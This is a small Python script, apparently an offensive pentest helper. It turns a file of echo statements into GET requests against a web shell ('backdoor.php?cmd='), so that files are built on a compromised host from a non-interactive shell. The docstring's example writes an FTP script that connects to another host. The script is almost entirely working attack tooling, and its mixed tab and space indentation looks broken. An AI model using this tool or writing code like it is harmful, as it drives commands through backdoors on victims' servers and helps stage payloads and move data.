#!/usr/bin/python
import optparse as OP
import sys
import requests
'''
	$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
	This program is utilized to convert a text file with
	echo statements utilized in exploitation from a 
	non-interactive shell. The output is converted into
	http string formats and sends the information via 
	'GET' method. 
	Example output sent to remote server:
	http://10.1.1.2/backdoor.php?cmd=echo open 10.1.1.1 21>ftp.txt
	$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
''' 
#parse args from command line, else exit gracefully
def getargs():
    parser = OP.OptionParser('usage: ./writeps1.py -T <transfer_file> -O <output_file> -U <host_url>')
    parser.add_option('-T', dest='transfer', type='string', help='specify file to transfer')
    parser.add_option('-O', dest='output', type='string', help='specify output filename')
    parser.add_option('-U', dest='url', type='string', help='specify host URL')
    (options, args) = parser.parse_args()
    transfer = options.transfer
    output = options.output
    url=options.url
    if (transfer == None) | (output == None) | (url == None):
        print parser.usage
        sys.exit(0)
    return transfer, output, url

#create the lines to write to file
def createlines(lines, kurl):
    httplines= []
	for line in lines:
        for temp in line:
            payload={'cmd': temp}
            r=requests.get(kurl, params=payload)
            httplines.append(r.url)
    return httplines
	
def readfilelines(transfer):
	lines = []
	with open(transfer) as f:
            content = f.readlines()
            content = [x.strip() for x in content]
            lines.append(content)
	return lines

	#write data to file
def writefile(filename, lines):
    for line in lines:
        with open(filename, 'a') as f:
			line += '\r\n'
            f.write(line)
           
def main():
    transfer, outfile, url = getargs()
    lines = readfilelines(transfer)
    httpstuff=createlines(lines, url)
	writefile(outfile, httpstuff)

if __name__ == "__main__":
    main()
